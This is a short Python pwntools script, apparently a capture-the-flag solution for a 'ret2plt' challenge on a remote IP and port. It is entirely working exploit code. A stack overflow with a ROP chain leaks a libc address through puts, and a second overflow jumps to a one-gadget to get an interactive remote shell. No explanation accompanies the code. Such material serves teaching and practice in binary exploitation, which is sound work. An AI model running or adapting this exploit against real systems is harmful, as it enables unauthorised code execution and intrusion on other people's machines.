from pwn import *
import time

context.arch = "amd64"

ip = "140.110.112.77"
port = 2125

r = remote(ip, port)
# r = process("./ret2plt")

main = 0x400636
printf_got = 0x601020
libc_start_got = 0x601028
puts_plt = 0x4004e0
pop_rdi = 0x4006f3

r.sendlineafter(':', b'a' * 40 + flat(pop_rdi, libc_start_got, puts_plt, main))
r.recvline()
libc = u64(r.recv()[:6].ljust(8, b'\x00')) - 0x020740
log.info(hex(libc))

magic = libc + 0x45216
time.sleep(0.1)
r.sendline(b'a' * 40 + flat(magic))

r.interactive()
